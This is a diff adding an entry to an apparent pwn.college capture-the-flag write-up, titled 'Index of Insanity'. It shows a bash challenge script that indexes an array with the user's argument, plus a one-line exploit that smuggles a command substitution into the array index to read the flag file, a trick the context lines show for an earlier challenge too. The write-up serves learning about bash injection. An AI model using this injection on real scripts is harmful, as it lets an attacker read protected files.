@@ -508,3 +508,27 @@ fi
 ```sh
 /challenge/run "a[\$(</flag)]"
 ```
+
+# Index of Insanity
+
+### chall
+
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+
+PROPAGANDA=(
+	"bash is good"
+	"bash is great"
+	"bash is wonderful"
+)
+
+INDEX="$1"
+echo "Your chosen bash affirmation is: ${PROPAGANDA[$INDEX]}"
+```
+
+### exploit
+```sh
+/challenge/run "a[\$(</flag)]"
+```
